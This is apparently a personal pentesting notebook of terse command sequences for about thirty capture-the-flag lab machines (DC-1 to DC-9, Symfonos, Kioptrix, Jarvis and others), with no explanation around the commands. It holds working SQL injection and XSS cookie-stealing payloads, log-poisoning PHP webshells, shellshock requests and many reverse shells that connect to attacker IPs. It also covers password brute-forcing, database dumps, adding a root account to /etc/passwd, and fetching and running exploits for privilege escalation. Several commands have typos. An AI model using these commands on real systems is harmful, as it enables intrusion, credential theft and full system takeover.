BOX STEP




Basic Pentesting 2
==================================
dirb http://10.0.2.14
enum4linux 10.0.2.14
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.0.2.14 ssh
ssh jan@10.0.2.14
https://www.exploit-db.com/download/44298.c
cat /home/kay/.ssh/id_rsa
ssh2john key > sshtojohn
john sshtojohn
ssh -i -d_rsa@localhost
cat pass.bak
sudo -i
##another way
find / -perm -u=s -type f 2>/dev/null
cd home/kay/
vim.basic pass.bak




Web For Pentester I & II
==================================
##SQL Inject
root' or '1'='1
root'%09or%09'1'='1
root'/**/or/**/'1'='1
2'/**/or/**/'1'='1
2 or 1=1
' or 1=1#
‘ or 1=1 LIMIT 1#
example5/?limit=3 union all select * from users
username =’\ ‘ and password =’ or 1=1#
/example5/?group=username union all select * from users
example7/?id=1 --dump-all)
呵' or 1=1 #
##XXS
<script>document.write('<img src="http://10.0.2.15/?'+document.cookie+'  "/>');</script>
#socat TCP-LISTEN:80,reuseaddr,fork -
>document.cookie = "PHPSESSID=07st4kqcbdr2ddrd4naalt9504"
<script>alert(1);</script>
<script>alert(1);</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src="xxxx" onerror="alert(1)">
<script>prompt(1)</script>
";alert(1);//
';alert(1);//
/" onmouseover="alert(1)
#<script>alert(1)</script>



Pumpkin Garden
==================================
nmap -p- -A 10.0.2.15
ftp 10.0.2.15
get note.txt
cat note.txt
dirb http://10.0.2.15:1515
10.0.2.15;1515/img/hidden_secret/clue.txt
echo c2NhcmVjcm93IDogNVFuQCR5 | base64 -d
ssh scarecrow@10.0.2.15 -p 3535
su goblin
##exploit https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh
cat > sudoedit << _EOF
#!/bin/sh
echo ALEX-ALEX
su
/bin/su
/usr/bin/su
_EOF
chmod a+x ./sudoedit
sudo ./sudoedit $1



Necromancer 1
==================================
nmap -sU -p1-65535 10.0.2.16
nc -lvp 4444
echo "$from port 4444" | base64 -d
nc -u 10.0.2.16
opensesame ##md5 hash reverse flag3
nikto -h 10.0.2.16
wget http://10.0.2.16/pileoffeathers.jpg
strings pileoffeathers.jpg
zip pileoffeathers.jpg && unzip pileoffeathers
cat feathers.txt
10.0.2.5/amagicbridgeappearsatthechasm
cewl https://en.wikipedia.org/wiki/List_of_occult_terms -m4 -d0 -w listofwords.txt
wget http://10.0.2.16/amagicbridgeappearsatthechasm/talisman
chmod 700 talishman && ./talishman
wearTalisman
chantToBreakSpell
echo “blackmagic” | nc -u 10.0.2.16 31337
http://10.0.2.16/thenecromancerwillabsorbyoursoul/
aircrack-ng /root/Downloads/necromancer.cap -w /usr/share/wordlists/rockyou.txt
use auxiliary/scanner/snmp/snmp_enum
set rhost 10.0.2.16
set community death2all
run
snmpwalk -v 2c -c death2all 10.0.2.16
Unlocked
hydra -l demonslayer -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.16:22
ssh demonslayer@10.0.2.16
nc -u localhost 777
KELEWAN
Mephistopheles
Hedge
sudo cat /root/flag11.txt



Replay 1 CTF
==================================
10.0.2.17/robots.txt
wget 10.0.2.17/bob_bd.zip
unzip bob_bd.zip
string client.bin
##found 2nd passwd, 1st passwd inside html homepage
./client.bin ##apps to connect database, use it to make machine connect me
vi client.bin
nc -e /bin/bash 192.168.1.25 4444;ls;ls;ls;ls;ls;ls;ls; ##binnary file read binary reverse
nc -lvp 3434
python -c 'import pty;pty.spawn("/bin/bash")'
sudo -l
cd Documents/.ftp
cat user.passwd
sudo -i



Raven 1
==================================
nikto --host http://10.0.2.18
wpscan --url http://10.0.2.18/wordpress --wp-content-dir -ep -et -eu
wpscan --url http://10.0.2.18/wordpress -U steven -w /usr/share/wordlists/rockyou.txt

##login ssh user michael no passwd
ssh michael@10.0.2.18
cat /var/www/html/wordpress/wp-config.php
john wp_hashes.txt
john show wp-hashes.txt
su steven
sudo -l
sudo python -c 'import pty;pty.spawn("/bin/bash")';
sudo python -c 'import os;os.system("/bin/bash")'
 



DerpNStink
==================================
dirb http://10.0.2.19 /usr/share/wordlist/dirb/big.txt
wpscan --url http://10.0.2.19/weblog
		##login admin admin & upload php reverse shell to galery /usr/share/webshells/php/php-reverse-shell.php
nc -lvp 3434
cat /var/www/html/weblog/wp-config.php
		##wp-config.php get credentials databases
		##login ftp, get rsa key, login ssh
ssh key stinky@10.0.2.19
		##download pcap exe with wireshark and get the password
su mrderp
sudo -l
mkdir -p /home/mrderp/binaries/
echo "/bin/bash" > derpy.sh && chmod +x derpy.sh


Casino Royale
==================================
dirb http://10.0.2.20
searchsploit poker
searchsploit -m 6676
sqlmap -u http://10.0.2.20/pokeradmin/index.php --forms --risk 3 --level 5 --dbs --batch
sqlmap -u http://10.0.2.20/pokeradmin/index.php --forms --risk 3 --level 5 -D pokerleague --dump-all --batch
searchsploit snowfox
telnet 10.0.2.20 25
mail from: asd
rcpt to: valenka
data
subject: obanno
http://10.0.2.16/form.html
.
quit
		##php web shell by login ftp
ftp://10.0.2.20
nc -lvp 3434
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
		##root apps running under user apps & edit user apps with python reverse run by root
export RHOST="10.0.2.16";export RPORT=2323;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
nc -lvp 2323



DC-1
==================================
nmap -sV -sC 10.0.2.21
whatweb http://10.0.2.21
searchsploit Drupal 7
python /usr/share/exploitdb/exploits/php/webapps/34992.py -u asdasdasd -p asdasdasd -t http://10.0.2.21
##login, insert plugin from https://www.drupal.org/project/shell
nc -nv 10.0.2.16 3434 -e /bin/bash
nc -lvp 3434
msfconsole
use exploit/multi/http/drupal_drupageddon
set lhost 10.0.2.21
run exploit
find / -perm -4000 -type f 2>/dev/null | xaxrgs ls -laht
find . -exec '/bin/sh' \;
find / -name flag*
cat /var/www/sites/default/settings.php



DC-2
==================================
nmap -sC -sV -A -p- 10.1.1.43
wpscan --url http://dc-2/ -e u,vt,vp
http://dc-2/index.php/flag
./cewl.rb http://dc-2/ -w cewlpasswd.txt
wpscan --url http:dc-2 -U user.txt -P cewlpasswd.txt
		##got credz jerry:adipiscing tom:parturient
ssh tom@10.1.1.43 -p 7744
help
vi
:set shell=/bin/bash
:shell
echo $PATH
export PATH=$PATH:/bin:/usr/bin
su jerry
sudo -l
sudo git -p help config
!/bin/sh





DC-3
==================================
nmap -sC -sV -A -p- 10.1.1.44 -o nmap
dirb http://10.1.1.44
http://10.1.1.44/administrator
http://10.1.1.44/language/en-GB/en-GB.xml
joomscan 10.1.1.44
searchsploit joomla 3.7.0
searchsploit -m 42033.txt
sqlmap -u "http://10.1.1.44/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
sqlmap -u "http://10.1.1.44/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables
sqlmap -u "http://10.1.1.44/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -T '#__users' -C name,password --dump
		##got credz admin:$27$10y$bouue197ghou4tf971gh3ougt913
john joomlacredz.txt --wordlist=/home/rockyou.txt
		##got crack admin:snoopy
		##login as admin and edit template to get reverse shell
nv -lvp 4343
python -c 'import pty.pty.spawn("/bin/bash")'
^z
stty raw -echo
fg
reset
which wget
python -m SimpleHTTPServer 8888
wget http://10.1.1.5:8888/linenum.sh .
chmod +x linenum.sh
./linenum.sh
serachsploit ubuntu 16.04 4.4
searchsploit -m 39772.txt
wget https://github.com/offensive-sercurity/exploitdb-bin-sploits/raw/master/binsploits/39772.zip
unzip 39772.txt
cd 39772
tar -xvf exploit.tar
./compile.sh
./doubleput





DC-4
====================================
nmap -sC -sV -A -p- 10.1.1.45 -o nmap
dirb http://10.1.1.45 -X .php
curl -v http://10.1.1.45/command.php
hydra -l admin -P /home/rockyou.txt 10.1.1.45 http-post-form "/login.php:username=^USER^&password=^PASS^:S=302" -V
		##failed lolz
		##bruteforce with bupsuite wordlist /usr/share/wordlist/dirb/others/
		##got credz admin:password
http://10.1.1.45/command.php
		##get reverse shell
cat /home/jim/backup/passwd.bak
nc -w 3 10.1.1.5 4321 < passwd.bak
nc -lvp 4321 . passwd.txt
hydra -l jim -P passwd.txt 10.1.1.45 -t 4 -V ssh
		##got credz jim:jibril04
cat /var/mail/jim
		##got credz charles"^mZstqhsq9
ssh charles@10.1.1.45
sudo -l
LFILE=/etc/passwd
echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" | sudo teehee -a "$LFILE"
su rooot





DC-5
=======================================
nmap -sC -sV -A -p- 10.1.1.46 -o nmap
dirb http://10.1.1.46 -X .php
http://10.1.1.46/thankyou.php?file=/etc/passwd
	#ngix poisoning webshell
http://10.1.1.46/thankyou.php?file=/var/log/nginx/error.log
http://10.1.1.46/thankyou.php?file=<?php system($_GET["c"]) ?>
http://10.1.1.46/thankyou.php?file=/var/log/nginx/error.log&c=id
http://10.1.1.46/thankyou.php?file=/var/log/nginx/error.log&c=nc -e /bin/bash 10.1.1.5 4343
nc -lvp 4343
find / -uid 0 -perm -4000 -type f 2>/dev/null | xargs ls -laht
searchsploit screen-4.5.0
searchsploit -m 41152.txt
screen --version
searchsploit -m 41154.sh
			##just like Wintermute
			##exploit screen 4.5


DC-6
======================================
nmap -sC -sV -A -p- 10.1.1.47 -o nmap
dirb http://10.1.1.47 -X .php
wpscan --url=http://wordy/ -e u,vt,vp
cat /home/rockyou.txt | grep k01 > passwd.txt
wpscan --url=http://wordy/ -U user.txt -P passwd.txt
		##got credz mark:helpdesk01
searchsploit wordpress activity
serachsploit -m 45274
nano 45274.html
		##edit target and ip
python -m SimpleHTTPServer 8888
127.0.0.1:8888/45274.html
nv -lvp 4343
python -c 'import pty;pty.spawn("/bin/bash")'
cat /home/mark/stuff/things-to-do.txt
		##got credz graham:GSo7isUM1D4
ssh graham@wordy
sudo -l
nano /home/jens/backup.sh
		##add /bin/bash
sudo -u jens backup.sh
sudo -l
echo "os.execute('/bin/sh')">/tmp/root.nse
sudo nmap --script=/tmp/root.nse




DC-7
====================================
nmap -sC -sV -A -p- 10.1.1.48 -o nmap
dirb http://10.1.1.48 -X .php
git clone https://github.com/immunIT/drupwn
python3 setup.py install
drupwn enum http://10.1.1.48/
https://github.com/Dc7User
		##got credz dc7user:MdR3xiast8
ssh dc7user@10.1.1.48
cat mbox
cat /opt/script/backups.sh
drush --help
cd /var/www/html
drush user-password admin --password=godmode
http://10.1.1.48/user/login
		##install new module from here: https://www.drupal.org/project/php
		##activate/enable and create new content with php reverse shell
nc -lvp 4343
cd /opt/script
msfvenom -p cmd/unix/reverse_netcat lhost=10.1.1.5 lport=4141 R
echo "mkfifo /tmp/asd; nc 10.1.1.5 4141 0</tmp/asd | /bin/sh >/tmp/asd 2>&1; rm /tmp/asd" >> backups.sh
nc -lvnp 4141
		##you can use either mkfifo or mknode reverse shell because nc version is not enable -e options





DC-8
===================================
nmap -sC -sV -A -p- 10.1.1.49 -o nmap
dirb http://10.1.1.49
droopescan scan drupal -u http://10.1.1.49
http://10.1.1.49/?nid=/etc/passwd
http://10.1.1.49/?nid=2'
sqlmap -u 10.1.1.48/\?nid\= --level 4 --dbs
sqlmap -u 10.1.1.48/\?nid\= --level 4 -D d7db --tables
sqlmap -u 10.1.1.48/\?nid\= --level 4 -D d7db -T users -C name,init,pass --dump
		##got credz john and admin
john credz.txt --wordlist=/home/rockyou.txt
		##got credz john:turtle
http://10.1.1.49/user/login
		##edit contact page, edit the form-setting and add reverse shell and put random string on the top or above
nc -lvp 4444
find / -uid 0 -perm -4000 -type f 2>/dev/null		
dpkg -l | grep exim
exim --version
searchsploit exim 4.89
searchsploit -m 46996
		##everytime I tried, I got error '\r':command not found
sed -i 's/\r$//' 46996.sh
nc 10.1.1.49 1234 < 46996.sh
nc -lvp 4321 > x.sh
bash x.sh -m netcat
nc -e /bin/bash 10.1.1.5 5555
nc -lvp 5555




DC-9
====================================
nmap -sC -sV -A -p- 10.1.1.52 -o nmap
dirb http://10.1.1.52 -X .php,.html,.txt,.log
http://10.1.1.52/welcome.php
		##capture search POST req into txt file
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt -D Staff --dump-all --batch
		##got credz admin:856f5de590ef37314e7c3bdf6f8a66dc
sqlmap -r req.txt -D users --dump-all --batch
sqlmap -r req.txt -D users -C username,password --batch
		##got another credz
http://10.1.1.52/welcome.php?file=../../../../etc/passwd
http://10.1.1.52/welcome.php?file=../../../../etc/knockd.conf
knock 10.1.1.52 9842 8475 7469
nmap -p22 10.1.1.52
hydra -L user.txt -P passwd.txt -T 4 10.1.1.52 ssh
		##got credz chandlerb:UrAG0D!
		##joeyt:Passw0rd
		##janitor:Ilovepeepee
ssh janitor@10.1.1.52
ls -lah
cat .secret-for-putin/password-foud-post-it-notes.txt
hydra -L user.txt -P passwd.txt -T 4 10.1.1.52 ssh
		##got new credz fredf:B4-Tru3-001
ssh fredf@10.1.1.52
sudo -l
cd /opt/devstuff/
cat test.py
openssl passwd -1 -salt ignite godmode
echo "rooot:w0cHJ.a5mvNYKk:0:0:root:/root:/bin/bash" >> /tmp/exp
sudo dist/test/test /etc/exp /etc/passwd
su rooot
id
cat ~/theflag.txt






Prime-1
====================================
dirb http://10.0.2.20
dirb http://10.0.2.20 -X .txt,.php,.html
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hw 500 --hl 6 http://10.0.2.20/image.php?secrettier360=FUZZ
msfveom -p php/meterpreter/reverse_tcp lhost=10.0.2.16 lport=3434 R
use exploit/multi/handler
show payloads
set payload php/meterpreter/reverse_tcp
set lhost 10.0.2.20
set lport 3434
exploit
/1
use exploit/linux/local/bpf_sign_extention_priv_esc
set session 1
exploit
/2
cd /tmp
nano exp.c ##grep this content https://packetstormsecurity.com/files/148517/Linux-Kernel-Local-Privilege-Escalation.html
gcc exp.c exp
./exp



HA Wordy
====================================
dirb http://10.0.2.19
wpscan --url http://10.0.2.19/wordpress --enumerate u
		##Reflex galery || Arbitary File Upload
use exploit/unix/webapp/wp_refrexgallery_file_upload
set rhost 10.0.2.19
set targeturi /wordpress/
exploit
find / -perm -u=s -type f 2>/dev/null ##cp & wget
cp /etc/passwd /var/www/html/ ##edit on local
openssl passwd -1 -salt ignite pass123
wget http://10.0.2.16/passwd
		##Mail Masta & WP Support || LFI
http://10.0.2.19/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
curl http://10.0.2.19/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/apache2/.htpasswd
echo "YWFydGk6YWFydGlAZ21haWwuY29t" | base64 -d	
searchsploit wp-support
searchsploit -m 41006
cat 41006.txt
		##create html file
<form method="post" action="http://wp/wp-admin/admin-ajax.php">
Username: <input type="text" name="username" value="aarti">
<input type="hidden" name="email" value="aarti@gmail.com">
<input type="hidden" name="action" value="loginGuestFacebook">
<input type="submit" value="Login">
</form>
		##Gwolle || RFI
http://10.0.2.19/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.0.2.16/shell.php
nc -lvp 3434



Symfonos: 1
====================================
enum4linux 10.0.2.22
smb://10.0.2.22/anonymous
smb://10.0.2.22/helios
smbclient //10.0.2.22/helios
wpscan --url http://symfonos.local/h3l105/ --enumerate u
		##Site Editor Exploit
http://10.0.2.22/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
		##SMTP Poisoning
telnet 10.0.2.20 25
helo example.com
mail from: asd@asd.asd
rcpt to: asd@symfonos.localdomain
data
<?php echo shell_exec($_GET['cmd']); ?>
http://10.0.2.22/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/asd&cmd=id
http://10.0.2.22/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/asd&cmd=nc%20-e%20%2Fbin%2Fbash%2010.0.2.16%203434
nc -lvp 3434
python -c 'import pty;pty.spawn("/bin/bash")'
find / -uid 0 -perm -4000 -type f 2>/dev/null | xargs ls -laht
strings /opt/statuscheck
		##build program set user id in C setuid.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void)
{setuid(0); setgid(0); system("/bin/bash");}
gcc -o setuid setuid.c
echo "chown root:root /tmp/setuid && chmod u+s /tmp/setuid" >> ./curl
chmod 777 curl && chmod 777 setuid
explort $PATH=/tmp:$PATH
/opt/statuscheck



Symfonos: 2
==================================
nmap -sC -sV 10.0.2.23
smbmap -H 10.0.2.23
smbclient -N \\\\10.0.2.23\\anonymous
cd backups
get log.txt
hydra -l aeolus -P /home/rockyou.txt ftp://10.0.2.23
ssh aeolus@10.0.2.23
cd /tmp
wget http://10.0.2.16/linuxenum.sh
./linuxenum.sh
/etc/apache2/sites-enabled
searchsploit librenms
ssh -L 8888:localhost:8080 aeolus@10.0.2.23
msfconsole
use exploit/linux/http/librenms_addhost_cmd_inject
set rhosts localhost
set rport 8888
set username aeolus
set password sergioteamo
set lhost eth0
exploit
python -c 'import pty;pty.spawn("/bin/bash")'
sudo -l
sudo /usr/bin/mysql -e '\! /bin/sh'



Symfonos 3
===================================
dirb http://10.0.2.24
dirbuster http://10.0.2.24/gate/
10.0.2.24/cgi-bin/underworld/
		##with metasploit 
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_enc_exec
set rhost 10.0.2.24
set lhost 10.0.2.16
set targeturi /cgi-bin/underworld/
exploit
		##shellshock with manual curl (manual 'uptime' command linux)
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.0.2.24/cgi-bin/underworld
curl -H "user-agent: () { :; }; echo; echo; /bin/nc -e /bin/bash 10.0.2.16 3434" http://10.0.2.24/cgi-bin/underworld
curl -A "() { :; }; /bin/bash -c 'nc 10.0.2.16 3434 -e /bin/sh'" http://10.0.2.24/cgi-bin/underworld
nc -lvp 3434
python -c "import pty;pty.spawn('/bin/bash')"
		##tools pspy monitor all process (include cron) real-time
wget http://192.168.127.129/pspy32
chmod 755 pspy32
./pspy32
tcpdump -v -i lo port 21
vi ftpclient.py
		##edit cron job file ftpclient.py
import socket,subprocess,os
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.2.16",9090))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(["/bin/sh","-i"])
		##or add this script under the line
import sys
import os
os.system(nc 10.0.2.16 9090 -e /bin/bash)
nc -lvp 9090



Symfonos 4
===================================
dirb http://10.0.2.27/ /usr/share/wordlists/dirb/big.txt -X .php
		## login sqli with 'or'1'='1'#
		#ssh poisoning log webshell
http://10.0.2.27/sea.php?file=../../../../../../../var/log/auth
ssh '<?php system($_GET['c']); ?>'@10.0.2.27
ssh 10.0.2.27 -l '<?php die(exec($_GET["c"]));?>'
http://10.0.2.27/sea.php?file=../../../../../../../var/log/auth&c=nc 10.0.2.16 3434 -e /bin/bash
nc -lvp 3434
ss -tulpn
ps
socat tcp-listen:7000,reuseaddr,fork tcp:localhost:8080
http://10.0.2.27:7000
		##intercept cookie
		##change with this reverse python script with base64 ecnryption
{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/sh 10.0.2.16 4444"], null, null, null]}
root:pass123


Solid State
===================================
nmap -sC -sV -p- 10.0.2.28
telnet 10.0.2.28 4555
help
listuser
setpassword james asd
setpassword john asd
setpassword mindy asd
telnet 10.0.2.28 110
user john
pass asd
list
retr 1
quit
telnet 10.0.2.28 110
user mindy
pass asd
list
retr 1
retr 2
quit
ssh mindy@10.0.2.28
exploitdb35513.py ##https://www.exploit-db.com/exploits/35513/
payload = 'nc -e /bin/sh 10.0.2.16 8000'
./exploitdb35513
nc -lvp 8000
ssh mindy@10.0.2.28
python -c 'import pty;pty.spawn("/bin/bash")'
ps -aux | grep james
cd /opt
ls || cat tmp.py
nano tmp.py
#!/usr/bin/env python
import os
import sys
os.system('/bin/nc -e /bin/bash 10.0.2.16 3434')
cd /tmp
wget http://10.0.2.16/tmp.py
nc -lvp 3434
cp tmp.py /opt




Node 1
===============================
nmap -sC -sV -p- 10.0.2.29
view-source:http://10.0.2.29:3000/login
view-source:http://10.0.2.29:3000/assets/js/app/controller/home.js
10.0.2.29:3000/api/users/latest
10.0.2.29:3000/api/users
		##hash crack with crackstation.net
cat myplace.backup | base64 -d > myplace
file myplace.backup
unzip myplace
fcrackzip –dictionary –use-unzip –init-password /usr/home/rockyou.txt myplace
cat app.js
ssh mark@10.0.2.29
uname -a
cat /etc/issue
wget https://www.exploit-db.com/download/44298 /tmp/44298.c
gcc 44298.c -o 44298
./44298
		##use mongodb exploit
cd /home/node/
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.16 LPORT=1234 -f elf -o rev
cp rev /var/www/html
wget http://10.0.2.16/rev
mongo mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler
mongo --usernmae mark --password 5AYRft73VtFpc84k --authenticationDatabase scheduler --host localhost
>db.tasks.insert({"_id" : 0, "cmd" : "/tmp/rev"})
>quit()
nc -lvp 1234
gzip -c < /usr/local/bin/backup > /tmp/backup.gz
base64 < /tmp/backup.gz




Kioptrix 1
===================================
nmap -sC -sV -V -p- 10.0.2.30
enum4linux 10.0.2.30
cp /usr/share/exploitdb/exploits/unix/remote/764.c
gcc -o fuck 764.c -lcrypto
./fuck 0x6b 10.0.2.30 -c 45
cp /usr/share/exploitdb/exploits/multiple/remote/10.c .
gcc -o exploitsamba 10.c
./exploitsamba -b 0 -c 10.0.2.16 10.0.2.30



OZ 1
===================================
##mysql seems not running
git clone https://github.com/epinna/tplmap
./tplmap.py -u 'http://192.168.204.132:8080' -X POST -d 'name=*&desc=anything' -c 'token=TOKEN' --reverse-shell 192.168.204.129 3434
nc -lvp 3434



MR Robot
===================================
nmap -sC -sV -A -p- 10.0.2.31 -oA nmapfull
dirb http://10.0.2.31
wpscan --url http://10.0.2.31 --enumerate u
http://10.0.2.31/robots.txt
cat fsocity.dic | sort -r | uniq > fsocity.dic.sort
wc -l fsocity.dic.sort
wpscan --url http://10.0.2.31 -U elliot -P /home/mrrobot/fsocity.dic.sort
cp /usr/share/webshell/php/php-reverse-shell.php
		##edit and upload shell into archive wordpress
nc -lvp 3434
python -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg
reset
 		##full stty source:https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
10.0.2.31/wp-content/themes/twentyfifteen/archive.php
		##crack password.raw-md5 from /home/robot in md5crack online
echo ljBOUvoyFpIgpUgfJFOyFoVouF > robothash
hashcat -a 0 -m 0 robothash /home/rockyou.txt 
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
/usr/local/bin/nmap --interactive
!sh



Pwn Lab INIT
===================================
dirb http://10.0.2.32
10.0.2.32/?page=php://filter/convert.base64-encode/resource=config
		##encode base64 passwd mysql
mysql -h 10.0.2.32 -u root -p
		##dump database Users
login
10.0.2.32/?page=upload
		##get source from response in burp
		##read rfi to exe source: https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/
10.0.2.32/?page=php://filter/convert.base64-encode/resource=index
document.cookie = "lang=../../../../../etc/passwd"
document.cookie = "lang=../upload/mif813yr9hosaf8h0iqj0.gif"
nc -lvp 3434"
10.0.2.32
su kane
cd && ls -lah
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
strings msgmike
echo /bin/bash > /tmp/cat
chmod 777 /tmp/cat
echo $PATH
export PATH=/tmp:$PATH
./msgmike
cd && ls -lah
find / -perm -4000 -type f 2>/dev/null | xargs | ls -laht
./msg2root
asdasd && /bin/sh
asdasd; bash -p
document.cookie= 'lang=../../../../../etc/passwd; expires=Thu; 01 Jan 1970 00:00:00 GMT; path=/; domain=10.0.2.32"
document.cookie= 'lang=../upload/mif813yr9hosaf8h0iqj0.gif; expires=Thu; 01 Jan 1970 00:00:00 GMT; path=/; domain=10.0.2.32"



Wintermute 1
==========================================
kali(10.0.2.16) - (.33) straylight (192.168.56.102) - (.103) Neuromancer
http://10.0.2.33:3000
http://10.0.2.33:3000/lua/flow_stats.lua
http://10.0.2.33/turing-bolo/bolo.php?bolo=../../../../../log/mail
telnet 10.0.2.33 25
helo asd.asd
mail from: asd@asd.asd
		##or mail from: <?php echo shell_exec($_GET['cmd']);?>
		##or rcpt to: <?php system($_POST['cmd']);?>
rcpt to: <?php system($_REQUEST['cmd']);?>
data
.
quit
http://10.0.2.33/turing-bolo/bolo.php?bolo=../../../../../log/mail&cmd=id
nc -lvp 3434
http://10.0.2.33/turing-bolo/bolo.php?bolo=../../../../../log/mail&cmd=nc%20-e%20%2Fbin%2Fbash%2010.0.2.16%203434
python -c 'import pty;pty.spawn("/bin/bash")'
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
searchsploit screen 4.5
cp /usr/share/exploitdb/exploits/linux/local/41154.sh .
		##cant complie, create manual making file libhax.c and rootshell.c
wget http://10.0.2.16/libhax.c
wget http://10.0.2.16/rootshell.c
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
gcc -o /tmp/rootshell /tmp/rootshell.c
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
screen -ls
./tmp/rootshell
wget http://10.0.2.16/ping.sh
cat ping.sh
#!/bin/bash
ip in $(seq 1 254); do
	ping -c 1 192.168.56.$ip | grep "bytes from" | cut -d " " -f4 |cut -d ":" -f1 &
done
nc -vnzw1 192.168.56.103 1-65535
which socat
socat TCP-LISTEN:8009,fork,reuseaddr TCP:192.168.56.103:8009 &
socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.56.103:8080 &
socat TCP-LISTEN:34483,fork,reuseaddr TCP:192.168.56.103:34483 &
socat TCP-LISTEN:4444,fork,reuseaddr TCP:10.0.2.16:4444 &
10.0.2.33:8080/struts2_2.3.15.1-showcase
searchsploit struts showcase
		##exploit struts as exploit.sh from https://www.exploit-db.com/exploits/42324/
nc -lvp 4444
./exploit.sh "nc 192.168.56.102 4444"
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f elf -o rev
cp rev /var/www/html
python -m SimpleHTTPServer 4444
./exploit.sh "wget http://192.168.56.102/rev -O /tmp/rev"
./exploit.sh "chmod 755 /tmp/rev"
./exploit.sh "sh -c /tmp/rev"
nc -lvp 4444
ssh keygen -t ta
cat id_ta.pub
		##copy id_ta from kali to authorized keys target
cd /home/ta
chmod 755 .ssh
touch .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
echo "cat id_ta.pub" > .ssh/authorized_keys
ssh -i id_ta -p 34483 ta@10.0.2.33
uname -a
searchsploit ubuntu 16.04
wget http://192.168.56.102/exploit ##source exploit https://www.exploit-db.com/exploits/44298/
chmod +x exploit
./exploit



Kioptrix 2
=================================================
http://10.0.2.15
##SQLi user:'or'a'='a'#
sqlmap -u "http://10.0.2.15/index.php" --dbms=MySQL --dump --data "uname=test&psw=pass" --level=5 --risk=3
cat php-reverse-shell.php | nc -l 8080
; wget 10.0.2.16:8080 -O /tmp/shell.php
; php /tmp/shell.php
; bash -i >& /dev/tcp/10.0.2.16/3434 0>&1
nc -lvp 3434
;/usr/local/bin/nc 10.0.2.16 4444 -e ‘/bin/bash'
nc -lvp 4444
searchsploit centos 4.5
cp /usr/share/exploitdb/exploits/linux_x86/local/9542.c /var/www/html/
python -m SimpleHTTPServer 8888
wget http://10.0.2.16/9542.c -O /tmp/ex.c
gcc ex.c
./ex.out
cat /var/www/html/index.php ##to find mysql cred




Jarvis
================================================
http://10.10.10.143/room.php?cod=3'
sqlmap -u http://10.10.10.143/room.php?cod=3 --dump
sqlmap -u http://10.10.10.143/room.php?cod=3 --level 5 --risk 3 --dump
sqlmap -u http://10.10.10.143/room.php?cod=3 --level 5 --risk 3 --os-shell
python -m SimpleHTTPServer 8888
wget http://10.10.14.86:8888/p0wny.php ##source https://github.com/flozz/p0wny-shell/blob/master/shell.php
http://10.10.10.143/shell.php
socat file:`tty`,raw,echo=0 tcp-listen:3434 ##listener
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.86:3434 ##target
netstat -plnt
sudo -l
python /var/www/AdminUtilities/simpler.py
python simpler.py -p
cat simpler.py
cat shell.sh
#!/bin/bash
0<&196;exec 196<>/dev/tcp/10.10.14.86/4343; sh <&196 >&196 2>&196
		##input $(/bin/bash /tmp/shell.sh)
nc -lvp 4343
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
		##exploit systemctl source:https://gtfobins.github.io/gtfobins/systemctl/
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
cat /tmp/output
echo '#/bin/bash
nc 10.10.14.86 9999 -e /bin/bash' > hacked
nc -lvp 4444  ##listening
echo '[Unit]
Descriptor= hacked Service
ExecStart=/bin/sh -c /tmp/hacked
[Install]
WantedBy=multi-user.target' > hacked.service
/bin/systemctl enable --now hacked.service
stop hacked.service
start hacked.service
/bin/bash -i  ##got root shell



Haystack
======================================
wget http://10.10.10.115/needle.jpg
strings needle.jpg
